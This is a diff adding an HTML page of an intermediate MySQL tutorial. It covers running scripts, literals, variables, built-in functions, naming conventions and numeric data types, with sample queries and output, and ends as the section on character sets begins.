@@ -1,0 +1,2253 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>An Intermediate MySQL Tutorial - Scripting, Data Types, Examples</title>
+<link href="../css/programming_notes_v1.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../scripts/programming_notes_v1.js"></script>
+<link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" /></head>
+
+<body>
+
+<div id="wrap-outer">
+
+<!-- header filled by JavaScript -->
+<div id="header" class="header-footer"><p>&nbsp;</p></div>
+
+<div id="wrap-inner">
+
+<div id="wrap-toc">
+<h5>TABLE OF CONTENTS <a id="show-toc" href="#show-toc">(HIDE)</a></h5>
+<div id="toc"></div>  <!-- for showing the "Table of Content" -->
+</div>
+
+<div id="content-header">
+<h1>Database Programming</h1>
+<h2>An Intermediate MySQL Tutorial<br />
+- Scripting, Data Types, Examples</h2>
+</div>
+
+<div id="content-main">
+
+
+<p>This article explains some concepts  in depth, such as scripting and data types. Read &quot;<a href="MySQL_Beginner.html">MySQL for Beginners</a>&quot; for the basics.</p>
+<h3> Scripting</h3>
+
+<h4>Creating and Running Scripts</h4>
+<p>I shall begin by describing the syntax of a MySQL script, as scripts will be used for all the examples in this tutorial.</p>
+<p>Instead of issuing each of the SQL statements from a <code>mysql</code> client interactively, it is often more convenience to keep the statements in a script. You could then run the entire script, or copy and paste selected statements to run.</p>
+
+<h5>Example</h5>
+<p>Use a programming text editor to create the following script and saved as &quot;<code>testscript.sql</code>&quot; in a chosen directory (e.g., &quot;<code>d:\myproject\sqlscripts</code>&quot;). You should use &quot;<code>.sql</code>&quot; as the  file extension.</p>
+
+<p>I recommend NetBeans which provides direct support to MySQL database (read <a href="MySQL_HowTo.html#NetBeansMySQL">NetBeans and MySQL</a>), or NotePad++ (@ <a href="http://notepad-plus.sourceforge.net/uk/site.htm">http://notepad-plus.sourceforge.net/uk/site.htm</a>), which recognizes &quot;<code>.sql</code>&quot; file as a SQL script with syntax highlighting.</p>
+<pre class="color-example">
+<span class="color-comment">/* 
+ * My First MySQL Script - testscript.sql.
+ * You need to run this script with an authorized user.
+ */</span>
+SHOW DATABASES;                <span class="color-comment">-- List the name of all the databases in this server</span>
+USE mysql;                     <span class="color-comment">-- Set system database 'mysql' as the current database</span>
+SELECT user, host FROM user;   <span class="color-comment">-- List all users by querying table 'user'</span></pre>
+
+<p>You can run the script using <code>mysql</code> client in two ways: <em>batch mode</em> or using <code>source</code> command.</p>
+
+<h5>Running Script in Batch Mode</h5>
+<p>To run a script in batch (non-interactive) mode, start a <code>mysql</code> client and redirect the script as the input, as follows:</p>
+<pre class="color-command">
+&gt; mysql -u <em>username</em> -p <strong>&lt; <em>path-to\scriptName.sql</em></strong>
+</pre>
+
+<p>The <em>input redirection operator</em> <code>'&lt;'</code> re-directs the input from the file, instead of the default standard input (i.e., keyboard). You may provide an <em>absolute</em> or <em>relative</em> path of the filename. You may need to double quote the filename if it contains special characters such as blank (strongly discouraged!).</p>
+<p>For example, we invoke the <code>mysql</code> client with user &quot;<code>myuser</code>&quot; in batch mode running the script &quot;<code>testscript.sql</code>&quot; created earlier. I assume that <code>myuser</code> is authorized to access <code>mysql</code> database.</p>
+<pre class="color-example">
+shell&gt; <strong>mysql -u myuser -p &lt; d:\myproject\sqlscripts\testscript.sql</strong>
+Enter password: ********
+Database              <span class="color-comment">&lt;= Output of SHOW DATABASES - Header</span>
+information_schema
+eastwind
+mysql
+test
+user    host          <span class="color-comment">&lt;= Output of SELECT - Header</span>
+root    127.0.0.1
+myuser  localhost
+root    localhost</pre>
+
+<p>The output contains the column headers and the rows selected. The column values are separated by 'tab'. This is to facilitate direct processing by another program. This format is known as TSV (Tab-Separated Values), similar to CSV (Comma-Separated Values).</p>
+
+<p>You could also redirect the output to a text file (via the output redirection operator <code>'&gt;'</code>), for example,</p>
+<pre class="color-example">
+&gt; mysql -u myuser -p &lt; d:\myproject\sqlscripts\testscript.sql <strong>&gt; output.txt</strong></pre>
+
+<p> To get the &quot;table-like&quot; output, use <code>-t</code> (table) option, for example,</p>
+<pre class="color-example">
+&gt; mysql -u myuser -p <strong>-t</strong> &lt; d:\myproject\sqlscripts\testscript.sql
+Enter password: ********
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| eastwind           |
+| mysql              |
+| test               |
++--------------------+
++--------+-----------+
+| user   | host      |
++--------+-----------+
+| root   | 127.0.0.1 |
+| myuser | localhost |
+| root   | localhost |
++--------+-----------+</pre>
+
+<p>You could echo the input commands via <code>-vvv</code> (verbose) option, for example,</p>
+<pre class="color-example">
+shell&gt; mysql -u myuser -p -t <strong>-vvv</strong> &lt; d:\myproject\sqlscripts\testscript.sql
+Enter password: ********
+--------------
+SHOW DATABASES
+--------------
+   
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| eastwind           |
+| mysql              |
+| test               |
++--------------------+
+4 rows in set (0.00 sec)
+   
+--------------
+SELECT user, host FROM user
+--------------
+   
++--------+-----------+
+| user   | host      |
++--------+-----------+
+| root   | 127.0.0.1 |
+| myuser | localhost |
+| root   | localhost |
++--------+-----------+
+4 rows in set (0.00 sec)
+   
+Bye</pre>
+
+<p>In batch mode, you can also <em>execute</em> statement(s) directly via <code>-e</code> (evaluate) option. For example,</p>
+
+<pre class="color-example">
+&gt; mysql -u myuser -p -vvv <strong>-e &quot;SELECT user, host FROM user; SHOW databases&quot; mysql</strong>
+Enter password: ********
+--------------
+SELECT user, host FROM user
+--------------
+   
++-----------+-----------+
+| user      | host      |
++-----------+-----------+
+| root      | 127.0.0.1 |
+  ....... 
++-----------+-----------+
+   
+--------------
+SHOW databases
+--------------
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| test               |
+  ......
++--------------------+
+   
+Bye</pre>
+
+<h5>Running Script via <span class="font-code">SOURCE</span> Command</h5>
+
+<p>In an interactive <code>mysql</code> client session, you can use the <code>source</code> command (or <code>\.</code> shorthand command) to run a script. For example,</p>
+<pre class="color-example">
+<span class="color-comment">-- Start and login to a mysql interactive client</span>
+shell&gt; mysql -u myuser -p
+Enter password: ********
+......
+
+<span class="color-comment">-- You can use 'source' command to run a script</span>
+mysql&gt; <strong>SOURCE d:/myproject/sqlscripts/mytestscript.sql</strong>
+......</pre>
+<p>Notes:</p>
+<ul>
+  <li>You could provide either absolute or relative path.</li>
+  <li>You need to use Unix-style forward-slash <code>'/'</code> as the directory separator. On Windows systems, you could also replace backslash <code>'\'</code> with double backslash e.g., &quot;<code>d:\\myproject\\sqlscripts\\mytestscript.sql</code>&quot;.</li>
+  <li>No single or double quotes needed (nor allowed) in filename.</li>
+  <li>&quot;<code>source</code>&quot; is a client-side command. Hence, there is no need for the terminating <code>';'</code> (to send the command to the server for processing).</li>
+</ul>
+
+<h4>MySQL Scripting Language Syntax</h4>
+
+<h5>Comments</h5>
+
+<p>A <em>multi-line comment</em> begins with <code>/*</code> and ends with <code>*/</code> (just like the C/C++/Java language). An <em>end-of-line comment</em> begins with <code>'-- '</code> (two dashes and a space) or #, which lasts till the end of the current line.</p>
+<p>Comments are ignored by the processing engine but are important to provide explanation and documentation for the script. I strongly encourage you to use comments liberally.</p>
+
+<h5>MySQL Specific Codes</h5>
+<p>Statements enclosed within <code>/*! .... */</code> are known as MySQL specific codes. They are recognized by the MySQL engine, but ignored by other database engines. In other words, they will be processed by MySQL but treated as comments by other databases.</p>
+<p>You could include an optional MySQL version number, e.g., <code>/*!40014 .... */</code>. The statements will be processed by MySQL if the server's version is at least at the specified version, e.g., version 4.00.14.</p>
+<p>You can find the MySQL server version via <code>show version()</code> command.</p>
+<p>MySQL specific codes (with version number) are often generated when you export a database via <code>mysqldump</code> utility. For example,</p>
+
+<pre class="color-example">
+/*!40101 SET NAMES utf8 */;
+/*!40101 SET SQL_MODE=''*/;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+CREATE DATABASE /*!32312 IF NOT EXISTS*/ `eastwind` /*!40100 DEFAULT CHARACTER SET latin1 */;
+......</pre>
+
+<h5>Identifiers and Backquotes</h5>
+<p>Identifiers (such as database names, table names and column names) must be back-quoted if they contain blanks and special characters; or are reserved word, e.g., <code>`date`</code>, <code>`order`</code>, <code>`desc`</code> (reserved words), <code>`Customer Name`</code> (containing space). </p>
+<p>It is a good practice to back-quote all the identifiers in a script to distinguish the names from the reserved words (possibly in future MySQL versions).</p>
+
+<h5>Case Sensitivities</h5>
+<p>MySQL keywords are not case-sensitive. For clarity, I often show the keywords in uppercase (e.g., <code>CREATE TABLE</code>, <code>SELECT</code>).</p>
+<p>The identifiers (such as database names, table names and column names) are case sensitive in some platforms; but case insensitive in others (e.g., In general, identifiers are case sensitive in Unixes but case-insensitive in Windows). Hence, it is a good practice to treat the identifiers as case-sensitive in th script.</p>
+<p>String comparison and sorting depend on the <em>character collation sequence</em> used. By default, string comparison in MySQL (Windows) are not case sensitive. (Need to further check on Unixes and Macs.)</p>
+
+<h4>Literals</h4>
+
+<p><span class="line-heading">String Literals:</span> A string literal (or string value) is enclosed by a pair of single quotes (e.g., <code>'a string'</code>)  (recommended);  or a pair of double quotes (e.g., <code>&quot;a string&quot;</code>).</p>
+<p> Some characters may create ambiguity when placed inside a single-quoted or double-quoted string, e.g., you cannot include a single quote in a single-quoted string. Some characters, such as tab, newline, are non-printable, and require a special notation to be included in a sting. Back-slash <code>'\'</code> is known as an <em>escape character</em>, which modifies the meaning of the character followed, as tabulated below:</p>
+
+<table class="table-zebra" style="width:80%">
+<tr>
+<th>Escape Sequence</th>
+<th>Meaning</th>
+<th>Why</th>
+</tr>
+
+<tr>
+<td><code>\'</code></td>
+<td>Single quote <code>'</code></td>
+<td rowspan="5">To resolve ambiguity.<br />
+  <code>'</code> and <code>&quot;</code> used for enclosing string,<br />
+  <code>\</code> for escape,<br />
+  <code>%</code> and <code>_</code> for pattern matching </td>
+</tr>
+
+<tr>
+<td><code>\&quot;</code></td>
+<td>Double quote <code>&quot;</code></td>
+</tr>
+
+<tr>
+<td><code>\\</code></td>
+<td>Back slash <code>\</code></td>
+</tr>
+
+<tr>
+<td><code>\%</code></td>
+<td>Percent <code>%</code></td>
+</tr>
+
+<tr>
+<td><code>\_</code></td>
+<td>Underscore <code>_</code></td>
+</tr>
+
+<tr>
+<td><code>\n</code></td>
+<td>Newline or LineFeed (FF) (<code>0AH</code>)</td>
+<td rowspan="6">For non-printable symbols</td>
+</tr>
+
+<tr>
+<td><code>\r</code></td>
+<td>Carriage Return (CR) (<code>0DH</code>)</td>
+</tr>
+
+<tr>
+<td><code>\b</code></td>
+<td>Back Space (<code>08H</code>)</td>
+</tr>
+
+<tr>
+<td><code>\t</code></td>
+<td>Tab (<code>09H</code>)</td>
+</tr>
+
+<tr>
+<td><code>\0</code></td>
+<td>ASCII NUL (<code>00H</code>)</td>
+</tr>
+
+<tr>
+<td><code>\Z</code></td>
+<td>Control-Z (<code>1AH</code>)</td>
+</tr>
+</table>
+
+<p>An escape followed by any other character listed above is treated as the character, e.g., <code>'\x'</code> is <code>'x'</code>. The escape sequence is case sensitive, i.e., <code>'\t'</code> is tab, but <code>'\T'</code> is <code>'T'</code>. String can be single-quoted or double-quoted to give you the flexibility of including quotes in a string without using escape sequence, e.g., <code>'This is &quot;GREAT&quot;'</code>, <code>&quot;Let's begin&quot;</code>.</p>
+
+<p><span class="line-heading">Hex Literals:</span> Hex values are written as <code>0x....</code> or <code>X'....'</code> or <code>x'....'</code>, e.g., <code>0xABCD</code>, <code>0xDEF</code>, <code>X'ABCD'</code>, <code>x'ABCD'</code>. You can obtain the hex value of a string using function <code>HEX()</code>. For example,</p>
+
+<pre class="color-example">
+<span class="color-comment">-- Show hex value of a string</span>
+mysql&gt; <strong>SELECT HEX('testing');</strong>
++----------------+
+| HEX('testing') |
++----------------+
+| 74657374696E67 |
++----------------+
+   
+<span class="color-comment">-- Hex value is displayed as string</span>
+mysql&gt; <strong>SELECT 0x74657374696E67;</strong>
++------------------+
+| 0x74657374696E67 |
++------------------+
+| testing          |
++------------------+
+   
+<span class="color-comment">-- Show hex value of Chinese characters in GBK with CMD uses codepage 936</span>
+mysql&gt; <strong>SELECT HEX('您好');</strong>
++-------------+
+| HEX('您好') |
++-------------+
+| C4FABAC3    |
++-------------+
+   
+mysql&gt; <strong>SELECT 0xC4FABAC3;</strong>
++------------+
+| 0xC4FABAC3 |
++------------+
+| 您好       |
++------------+</pre>
+
+<p><span class="line-heading">Bit Literals:</span> Similarly, a bit literal is written as <code>0b...</code> or <code>b'...'</code>, e.g., <code>0b1011</code>, <code>b'10111011'</code>.</p>
+
+<h4>Variables</h4>
+
+<p>There are various types of variables in MySQL: <em>System variables</em> (system-wide), <em>user-defined variables</em> (within a connection) and <em>local variables</em> (within a stored function/procedure).</p>
+
+<p><span class="line-heading">User-Defined Variables:</span> A user-defined variable begins with a <code>'@'</code> sign, e.g., <code>@myCount</code>, <code>@customerCreditLimit</code>. A user-defined variable is <em>connection-specific</em>, and is available within a connection. A variable defined in one client session is not visible by another client session. You may use a user-defined variable to pass a value among SQL statements within the same connection.</p>
+<p>In MySQL, you can define a user variables via:</p>
+<ol>
+<li><code>SET @<em>varname</em> = <em>value</em></code> or (<code>SET @<em>varname</em> := <em>value</em></code>)</li>
+<li><code>SELECT @<em>varname</em> := <em>value ...</em></code></li>
+<li><code>SELECT <em>columnName</em> INTO @<em>varname</em> ...</code></li>
+</ol>
+
+<p>For examples,</p>
+<pre class="color-example">
+mysql&gt; <strong>SET </strong><span class="color-new">@today = CURDATE()</span>;    <span class="color-comment">-- can use = or :=</span>
+mysql&gt; SELECT name FROM patients WHERE nextVisitDate = <span class="color-new">@today</span>;  <span class="color-comment">-- can use the variable within the session</span>
+ 
+mysql&gt; SET @v1 = 1, @v2 = 2, @v3 = 3;
+mysql&gt; SELECT @v1, @v2, @v3, @v4 := @v1 + @v2;  <span class="color-comment">-- Use := in SELECT, because = is for comparison</span>
+ 
+mysql&gt; SELECT <span class="color-new">@ali_dob := dateOfBirth</span> FROM patients WHERE name = 'Ali';
+mysql&gt; SELECT <span class="color-new">dateOfBirth INTO @kumar_dob</span> FROM patients WHERE name = 'kumar';
+mysql&gt; SELECT name WHERE dateOfBirth BETWEEN <span class="color-new">@ali_dob</span> AND <span class="color-new">@kumar_dob</span>;</pre>
+
+<p>Like all scripting languages, SQL scripting language is <em>loosely-type</em>. You do not have to explicitly declare the type of a variable, but simply assign a value.</p>
+
+<p><span class="line-heading">System Variables:</span> MySQL server maintains <em>system variables</em>, grouped in two categories: global and session. Global variables affect the overall operation of the server. Session variables affect individual client connections. A system variable may have both a global value and a session value.</p>
+<p>Global variables are referenced via <code>GLOBAL <em>variableName</em></code>, or <code>@@global.<em>variableName</em></code>. Session variables are referenced via <code>SESSION <em>variableName</em></code>, <code>@@session.<em>variableName</em></code> or simply <code>@@<em>variableName</em></code>.</p>
+<p>You can use <code>SET</code> statement to change the value of a variable. For example,</p>
+
+<pre class="color-example">
+SET GLOBAL sort_buffer_size = 1000000;
+SET global.sort_buffer_size = 1000000;
+SET SESSION sort_buffer_size = 1000000;
+SET session.sort_buffer_size = 1000000;
+SET @@sort_buffer_size = 1000000;        <span class="color-comment">-- Session</span></pre>
+
+<p>Use <code>SHOW SESSION|GLOBAL VARIABLES</code> to display the value of variables. You could use a pattern matching <code>LIKE</code> clause to limit the outputs. For example,</p>
+
+<pre class="color-example">
+<span class="color-comment">-- Show all session variables beginning with 'character_set'.
+</span>SHOW VARIABLE LIKE 'character\_set%';
+   <span class="color-comment">-- Need to use '\_' for '_' inside a string, because '_' denotes any character.</span>
+ 
+<span class="color-comment">-- Show all global variable beginning with 'max_'</span>
+SHOW GLOBAL VARIABLE LIKE 'max\_%';</pre>
+
+<p><span class="line-heading">Local Variables (within a Stored Program):</span> You could define local variables for stored programs (such as function and procedure). The scope of a local variable is within the program. You need to use a <code>DECLARE</code> statement to declare a local variable.  Local variable will be discussed later.</p>
+
+<h4>MySQL Built-in Functions</h4>
+
+<p>For details of MySQL built-in functions, refer to MySQL manual &quot;Functions and Operators&quot; @ <a href="http://dev.mysql.com/doc/refman/5.5/en//functions.html">http://dev.mysql.com/doc/refman/5.5/en//functions.html</a>.</p>
+
+<h5>MySQL String Functions</h5>
+<p>Reference: String Functions @ <a href="http://dev.mysql.com/doc/refman/5.5/en/string-functions.html">http://dev.mysql.com/doc/refman/5.5/en/string-functions.html</a>.</p>
+
+<ul>
+<li><span class="line-heading font-code">LENTH(<em>str</em>)</span>: returns the length of the string.</li>
+
+<li><span class="line-heading font-code">INSTR(<em>str</em>, <em>subStr</em>)</span>: returns the index of the <code><em>subStr</em></code> in the <code><em>str</em></code> or 0 otherwise. Index begins at 1.</li>
+
+<li><span class="line-heading font-code">SUBSTR(<em>str</em>, <em>fromIndex</em>, <em>len</em>)</span>: returns the substring from index of length. Index starts at 1.</li>
+
+<li><span class="line-heading font-code">UCASE(<em>str</em>)</span>, <span class="line-heading font-code">LCASE(<em>str</em>)</span>: returns the uppercase and lowercase counterpart.</li>
+
+<li><span class="line-heading font-code">CONCAT(<em>str1</em>, <em>str2</em>, ...)</span>: returns the concatenated string.</li>
+
+<li><span class="line-heading font-code">CONCAT_WS(<em>separator</em>, <em>str1</em>, <em>str2</em>, ...)</span>: concatenate with separator.</li>
+<li>more</li>
+
+</ul>
+
+
+<h5>MySQL <span class="font-code">GROUP BY</span> Aggregate Functions</h5>
+<p>Reference: MySQL &quot;<code>GROUP BY</code> (Aggregate) Functions&quot; @ <a href="https://dev.mysql.com/doc/refman/5.5/en/group-by-functions.html">https://dev.mysql.com/doc/refman/5.5/en/group-by-functions.html</a>.</p>
+<p>We can apply  <code>GROUP BY</code> aggregate functions to each group of rows.</p>
+
+<ul>
+<li><span class="line-heading font-code">COUNT([DISTINCT] <em>col</em>)</span>: returns the count of non-<code>NULL</code> rows. The optional <code>DISTINCT</code> discards duplicate rows.</li>
+
+<li><span class="line-heading font-code">COUNT(*)</span>: returns the count of the rows (including <code>NULL</code>).</li>
+
+<li><span class="line-heading font-code">MAX([DISTINCT] <em>col</em>)</span>, <span class="line-heading font-code">MIN([DISTINCT] <em>col</em>)</span>, <span class="line-heading font-code">AVG([DISTINCT] <em>col</em>)</span>, <span class="line-heading font-code">SUM([DISTINCT] <em>col</em>)</span>, <span class="line-heading font-code">STD([DISTINCT] <em>col</em>)</span>: these functions accept an optional keyword <code>DISTINCT</code> to discard duplicates<code></code>.</li>
+
+<li><span class="line-heading font-code">GROUP_CONCAT([DISTINCT] <em>col</em> [ORDER BY ...] [SEPARATOR ...])</span>: returns a string with the concatenated non-<code>NULL</code> values from a group. You can apply optional <code>DISTINCT</code> and <code>ORDER BY</code>. The default <code>SEPARATOR</code> is comma <code>','</code>.</li>
+</ul>
+
+<h5>MySQL Date/Time Functions</h5>
+<p>[TODO]</p>
+
+<h5>MySQL Mathematical Functions</h5>
+<ul>
+  <li><code>PI()</code>.</li>
+  <li><code>RAND()</code>: return a random float between 0 and 1.</li>
+  <li><code>ABS(<em>number</em>)</code>, <code>SIGN(<em>number</em>)</code>: return -1 if negative, 0 for zero, and 1 if positive.</li>
+  <li><code>CEIL(<em>float</em>)</code>, <code>FLOOR(<em>float</em>)</code>, <code>ROUND(<em>float</em>)</code>.</li>
+<li><code>GREATEST(<em>value1</em>, <em>value2</em>,...)</code>, <code>LEAST(<em>value1</em>, <em>value2</em>,...)</code>, </li>
+<li><code>EXP(<em>power</em>)</code>: base e, <code>LN(<em>number</em>)</code>: base e, <code>LOG(<em>number</em>, <em>base</em>)</code>, <code>LOG2(<em>number</em>)</code>, <code>LOG10(<em>number</em>)</code>, <code>POWER(<em>number</em>, <em>exponent</em>)</code>, <code>SQRT(<em>number</em>)</code>.</li>
+<li><code>SIN(<em>angleInRadians</em>)</code>, <code>ASIN(<em>number</em>)</code>, <code>COS(<em>angleInRadians</em>)</code>, <code>ACOS(<em>number</em>)</code>, <code>TAN(<em>angleInRadians</em>)</code>, <code>ATAN(<em>number</em>)</code>, <code>ATAN2(<em>y</em>, <em>x</em>)</code>, <code>COT(<em>angleInRadians</em>)</code>.</li>
+<li><code>DEGREES(<em>angleInRadians</em>)</code>, <code>RADIANS(<em>angleInDegrees</em>)</code>.</li>
+<li><code>BITCOUNT(<em>number</em>)</code>: return the number of bits set to 1.</li>
+<li><code>CONV(<em>number</em>, <em>fromBase</em>, <em>toBase</em>)</code>, <code>OCT(<em>number</em>)</code></li>
+<li><code>MOD(<em>number</em>, <em>modulo</em>)</code>, </li>
+<li><code>FORMAT(<em>float</em>, <em>decimalPlaces</em>)</code>: Format the given float with the given decimal places. <code>TRUNCATE(<em>float</em>, <em>decimalPlaces</em>)</code>: allow negative <code><em>decimalPlaces</em></code>.</li>
+</ul>
+
+
+<h4>Naming Convention</h4>
+<p>My preferred naming convention is as follows:</p>
+<ul>
+<li>Database name is a singular noun comprising one or more words, in lowercase joined with underscore <code>'_'</code>, e.g., <code>the_arena</code>, <code>southwind_traders</code>.</li>
+<li>Table name is a plural noun comprising one or more words, in lowercase joined with underscore <code>'_'</code>, e.g., <code>customers</code>, <code>orders</code>, <code>order_details</code>, <code>products</code>, <code>product_lines</code>, <code>product_extras</code>. Junction table created to support many-to-many relationship between two tables may include both the table name, (e.g., <code>suppliers_products</code>, <code>moives_actors</code>) or an action verbs (e.g., <code>writes</code> (author writes books)).</li>
+<li>Column name is a singular noun comprising one or more words, in lower case joined with underscores or in camel-case begins with a lowercase letter, e.g. <code>customerID</code>, <code>name</code>, <code>dateOrdered</code>, and <code>quantityInStock</code>.</li>
+<li>MySQL displays database names and table names in lowercase, but column names in its original case.</li>
+<li> It is a good practice NOT to include special characters, especially blank, in names (unless you are looking for more challenge - these names must be back-quoted). Avoid MySQL reserved words, especially <code>date</code>, <code>time</code>, <code>order</code>, <code>desc</code> (used <code>dateOrdered</code>, <code>timeOrdered</code>, and <code>orders</code> instead). Backquote the names, if they contain special characters, or are SQL reserved words, e.g., <code>`date`</code>, `order`, <code>`Customer ID`</code>. It is a good practice to always backquote the names in script.</li>
+</ul>
+
+<p>[TODO] Camel-case or lower-case join with underscore?</p>
+
+<h3>MySQL Data Types</h3>
+<p>As a programmer, understanding the data types is <em>curial</em> in understanding the working of the underlying database system. (Read &quot;<a href="../java/DataRepresentation.html">A Tutorial on Data Representation - Integers, Floating-point Numbers, and Character Sets</a>&quot;.)</p>
+<p>MySQL supports many data types, grouped in 3 categories:</p>
+<ol>
+  <li><span class="line-heading">Numeric:</span> including integers, floating-point numbers, bits and boolean.</li>
+  <li><span class="line-heading">String:</span> including fixed-length and variable-length strings, binary data, and collections (enumeration and set).</li>
+  <li><span class="line-heading">Date/Time:</span>  Date and time are extremely important in database applications. This is because business records often carry date/time information (e.g., <code>orderDate</code>, <code>paymentDate</code>). There is also a need to time-stamp the creation and last update of  records for auditing and security considerations. MySQL provides many date/time data types (e.g., <code>DATETIME</code>, <code>DATE</code>, <code>TIME</code>, <code>YEAR</code>, <code>TIMESTAMP</code>) and built-in functions for date/time manipulation.</li>
+</ol>
+
+<h4>Numeric - Integers</h4>
+<p>Integers, by default, are <em>signed</em> integers; unless <code>UNSIGNED</code> is declared.</p>
+<p> You could set the  display width, using the syntax <code><em>INTEGER_TYPE</em>(<em>n</em>)</code>, where <code><em>n</em></code> is the display field-width of up to 255, e.g., <code>INT(10)</code>. You could also specify <code>ZEROFILL</code> to pad the displayed numbers with leading zeros (for <code>UNSIGNED</code> only) instead of blanks. The field-width affects only the display, and not the number stored.</p>
+<p>MySQL supports many integer types with various precisions and ranges.</p>
+
+<ul>
+  <li><span class="line-heading font-code">TINYINT</span>: 8-bit precision. The range is <code>[-128, 127]</code> for signed integer, and <code>[0, 255]</code> for unsigned.</li>
+  <li><span class="line-heading font-code">SMALLINT</span>: 16-bit precision. The range is <code>[-32768, 32767]</code> for signed integer, and <code>[0, 65535]</code> for unsigned.</li>
+  <li><span class="line-heading font-code">MEDIUMINT</span>: 24-bit precision. The range is <code>[-8388608, 8388607]</code> for signed integer, and <code>[0, 16777215]</code> for unsigned.</li>
+  <li><span class="line-heading font-code">INT</span> (or <span class="line-heading font-code">INTEGER</span>): 32-bit precision. The range is <code>[-2147483648, 2147483647]</code> for signed integer, and <code>[0, 4294967295]</code> for unsigned.</li>
+  <li><span class="line-heading font-code">BIGINT</span>: 64-bit precision. The range is <code>[-9223372036854775808, 9223372036854775807]</code> for signed integer, and <code>[0, 18446744073709551615]</code> for unsigned.</li>
+  <li><span class="line-heading font-code">BIT(<em>n</em>)</span>: A <em>n</em>-bit column. To input a bit-value, use the syntax <code>b'<em>value</em>'</code> or <code>0b<em>value</em></code>, e.g., <code>b'1001'</code>, <code>0b10010</code>.</li>
+  <li><span class="line-heading font-code">BOOLEAN </span>(or <span class="line-heading font-code">BOOL</span>): same as <code>TINYINT(1)</code> (with range of -128 to 127, display field-width of 1). Value of zero is considered false;  non-zero is considered true. You could also use <code>BIT(1)</code> to store boolean value.</li>
+</ul>
+
+<p>Choosing the right integer type is important for optimizing storage usage and computational efficiency. For example, for a integer column with a range of 1 to 9999, use <code> SMALLINT(4) UNSIGNED</code>: for 1 to 9999999, use <code>MEDIUMINT(7) UNSIGNED</code> (which shall be sufficient for a small business, but always allow more room for future expansion).</p>
+
+<p>Integers (and floating-point numbers to be discussed later) could  be declared as <code>AUTO_INCREMENT</code>, with default starting value of 1. When you insert a <code>NULL</code> (recommended) (or 0, or a missing value) into an <code>AUTO_INCREMENT</code> column, the maximum value of that column plus 1 would be inserted. You can also insert any valid value to an <code>AUTO_INCREMENT</code> column, bypassing the auto-increment. Take note that further <code>INSERT</code> would fail if the last <code>INSERT</code> has reached the maximum value. Hence, it is recommended to use <code>INT</code> for <code>AUTO_INCREMENT</code> column to avoid handling over-run. There can only be one <code>AUTO_INCREMENT</code> column in a table and the column must be defined as a key.</p>
+
+<p><span class="line-heading">Example (Testing  the Integer Data Types):</span> Read &quot;<a href="codes/integer_arena.sql.txt"><code>integer_arena.sql</code></a>&quot;.</p>
+
+<p><span class="line-heading">Example (Testing <span class="font-code">AUTO_INCREMENT</span>):</span> <a href="codes/autoincrement_arena.sql.txt">autoincrement_arena.sql</a>.</p>
+
+<h4>Numeric - Fixed-Point &amp; Floating-Point Numbers</h4>
+<p>MySQL supports both <em>approximated</em> floating points (<code>FLOAT</code> and <code>DOUBLE</code>) and <em>exact</em> fixed-point point (<code>DECIMAL</code>).</p>
+<ul>
+  <li><span class="line-heading font-code">FLOAT</span>: 32-bit single precision floating-point numbers. You can specify <code>UNSIGNED</code> to disallow negative number, and <code>ZEROFILL</code> to pad the displayed number with zeros.</li>
+  <li><span class="line-heading font-code">DOUBLE</span> (or <span class="line-heading font-code">DOUBLE PRECISION</span> or <span class="line-heading font-code">REAL</span>): 64-bit double precision floating-point numbers.</li>
+  <li><span class="line-heading font-code">DECIMAL(<em>n</em>, <em>d</em>)</span> (or <span class="line-heading font-code">DEC</span> or <span class="line-heading font-code">NUMERIC</span> or <span class="line-heading font-code">FIXED</span>): fixed-point decimal numbers, where <em><code>n</code></em> is the number of digits with <em><code>d</code></em> decimal places. For example, <code>DECIMAL(6, 2)</code> specifies 6 total digits (not including the decimal point) with 2 digit after the decimal point, which has the range of <code>-9999.99</code> to <code>9999.99</code>.<br />
+Unlike <code>INT(<em>n</em>)</code>, where <em><code>n</code></em> specifies the display field-width and does not affect the number stored; <em><code>n</code></em> in <code>DECIMAL(<em>n</em>, <em>d</em>)</code> specifies the range and affects the number stored.<br />
+The fixed-point <code>DECIMAL</code> is not available in popular languages such as C/C++/Java/C#. <code>DECIMAL</code> is an <em>exact</em> representation, as it is represented as integer with a fix decimal point. On the other hand, <code>FLOAT</code> and <code>DOUBLE</code> values are approximated and inexact, which create problems in <em>comparison</em> and cause rounding errors in arithmetic operations. Attempt to compare inexact values using <code>'='</code> and <code>'&lt;&gt;'</code> leads to unexpected result.<br />
+<code>DECIMAL</code> type was created for representing <em>currency</em>, which is exact and does not suffer from rounding errors in addition and subtraction. For example, <code>DECIMAL(<em>n</em>, 2)</code>. <code>DECIMAL</code> values can be compared with <code>'='</code> or <code>'&lt;&gt;'</code>.</li>
+  <li><span class="line-heading font-code">FLOAT(<em>n</em>, <em>d</em>)</span> or <span class="line-heading font-code">DOUBLE(<em>n</em>, <em>d</em>)</span>: Stored with <em><code>n</code></em> total digits with <em><code>d</code></em> decimal places. Exact or Approximated?? Advisable to use <code>DECIMAL(<em>n</em>, <em>d</em>)</code>.</li>
+</ul>
+
+<p>The fixed-point and floating-point numbers can also be declared as <code>UNSIGNED</code> to exclude negative numbers.</p>
+
+<p><span class="line-heading">Example (Testing the Floating-point Data Type):</span> Read &quot;<a href="codes/floatingpoint_arena.sql.txt"><code>floatingpoint_arena.sql</code></a>&quot;.</p>
+
+
+<h4>Character Sets and Collations</h4>
+<p>Strings are made up of a sequence of characters. Before presenting the various string data types, it is important to understand the so-called <em>character set</em> and <em>collating sequence</em> (or <em>collation</em>).</p>
+
+<h5>Character Sets</h5>
+
